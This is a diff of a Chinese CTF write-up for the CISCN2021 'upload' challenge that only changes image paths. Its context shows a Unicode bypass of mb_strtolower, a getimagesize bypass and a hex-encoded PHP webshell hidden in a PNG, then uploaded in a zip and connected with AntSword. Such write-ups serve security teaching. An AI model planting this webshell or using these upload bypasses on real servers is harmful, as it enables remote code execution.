@@ -680,7 +680,7 @@ if (!isset($_GET[&#34;ctf&#34;])) &amp;#1">
 
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="mb-strtolower"><a href="#mb-strtolower" class="headerlink" title="mb_strtolower()"></a>mb_strtolower()</h3><p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915111256461.png"></p>
+<h3 id="mb-strtolower"><a href="#mb-strtolower" class="headerlink" title="mb_strtolower()"></a>mb_strtolower()</h3><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915111256461.png"></p>
 <p>需要<code>zip</code>字符，但前面又过滤了<code>i</code></p>
 <p>利用unicode字符绕过</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -688,7 +688,7 @@ if (!isset($_GET[&#34;ctf&#34;])) &amp;#1">
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>因为这里又有个url解码</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144712527.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144712527.png"></p>
 <p>所以再加个url编码结果为<code>%C4%B0</code></p>
 <h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>可在发包数据中添加如下代码绕过，记得加0d0a换行符。</p>
 <pre class="line-numbers language-none"><code class="language-none">#define width 1
@@ -699,29 +699,29 @@ if (!isset($_GET[&#34;ctf&#34;])) &amp;#1">
 payload &#x3D; b&quot;a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>需要进行修改，流程如下：</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141018586.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141018586.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">5b 3c 3f 3d 24 5f 47 45 54 5b 30 5d 28 24 5f 50 4f 53 54 5b 31 5d 29 3b 3f 3e 58 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>粘贴进010</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141756327.png"></p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141727306.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141756327.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915141727306.png"></p>
 <p>然后进行编辑,要求和之前长度一致</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142448122.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142448122.png"></p>
 <p>再转换一下</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142544741.png"></p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142844397.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142544741.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915142844397.png"></p>
 <p>生成下payload</p>
 <pre class="line-numbers language-none"><code class="language-none">python generate.py -m php -o a.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915143245121.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915143245121.png"></p>
 <p>将a.png改为a.php并压缩成zip</p>
 <p>然后上传</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144814387.png"></p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144822309.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144814387.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915144822309.png"></p>
 <h3 id="上传改包问题"><a href="#上传改包问题" class="headerlink" title="上传改包问题"></a>上传改包问题</h3><p>试了很久，上传成功，但是下载下来zip包有错，经过测试发现一个问题，如果是burpsuite重传数据包或者中途截断再发送，都会导致zip包出错，猜测是burpsuite抓到包经过了编码，一些不可视的字符被转换过了，所以发包的时候数据已经被破坏了，所以尽量用winhex或010改好数据再上传</p>
 <p>而且还得加好换行符<code>0d0a</code>，否则解压还会失败。</p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915224135552.png"></p>
-<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915223602985.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915224135552.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2021-Quals-upload/image-20210915223602985.png"></p>
 <p>然后蚁剑连接/example/a.php，结束。</p>
 
                 
